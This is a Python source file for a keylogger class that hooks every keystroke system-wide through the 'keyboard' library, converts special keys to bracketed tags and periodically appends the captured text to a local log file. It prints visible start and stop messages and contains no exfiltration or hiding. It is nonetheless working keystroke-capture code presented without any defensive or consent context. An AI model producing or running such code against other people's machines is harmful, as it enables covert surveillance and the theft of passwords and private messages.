import keyboard
from datetime import datetime
from threading import Event
from time import sleep

class Keylogger:
    def __init__(self, log_file="keylog.txt", save_interval=10):
        self.log_file = log_file
        self.buffer = []
        self.save_interval = save_interval
        self.key_count = 0
        self.hook = None
        
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write(f"=== Keylogger Started at {datetime.now()} ===\n\n")
    
    def on_key_event(self, event):
        if event.event_type == 'down':
            key = event.name
            
            special_map = {
                'space': ' ',
                'enter': '\n',
                'tab': '\t',
                'backspace': '[BACKSPACE]',
                'delete': '[DELETE]',
                'shift': '[SHIFT]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]',
                'esc': '[ESC]',
                'up': '[UP]',
                'down': '[DOWN]',
                'left': '[LEFT]',
                'right': '[RIGHT]',
                'home': '[HOME]',
                'end': '[END]',
                'page up': '[PAGE_UP]',
                'page down': '[PAGE_DOWN]',
                'caps lock': '[CAPS_LOCK]',
                'num lock': '[NUM_LOCK]',
                'scroll lock': '[SCROLL_LOCK]',
                'print screen': '[PRINT_SCREEN]',
                'insert': '[INSERT]',
                'menu': '[MENU]'
            }
            
            for i in range(1, 13):
                special_map[f'f{i}'] = f'[F{i}]'
            
            if key in special_map:
                self.buffer.append(special_map[key])
            else:
                self.buffer.append(key)
            
            self.key_count += 1
            
            if self.key_count >= self.save_interval:
                self.save_to_file()
                self.key_count = 0
    
    def save_to_file(self):
        if self.buffer:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(''.join(self.buffer))
            self.buffer.clear()
    
    def start(self, stop_event: Event | None = None):
        print(f"Keylogger started. Logging to: {self.log_file}")
        self.hook = keyboard.hook(self.on_key_event)
        
        try:
            while True:
                if stop_event and stop_event.is_set():
                    break
                sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def stop(self):
        if self.hook:
            keyboard.unhook(self.hook)
        self.save_to_file()
        print(f"\nKeylogger stopped. Saved to {self.log_file}")